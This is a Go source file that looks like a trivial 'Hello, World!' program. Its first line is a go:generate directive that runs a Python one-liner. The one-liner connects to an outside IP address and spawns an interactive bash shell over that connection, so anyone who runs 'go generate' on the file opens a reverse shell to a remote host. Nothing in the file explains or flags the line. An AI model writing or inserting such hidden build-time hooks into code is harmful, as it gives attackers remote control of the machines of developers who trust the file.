//go:generate python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("35.184.92.106",9897));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

package main

import (
    "fmt"
)

func main() {
    fmt.Println("Hello, World!")
}
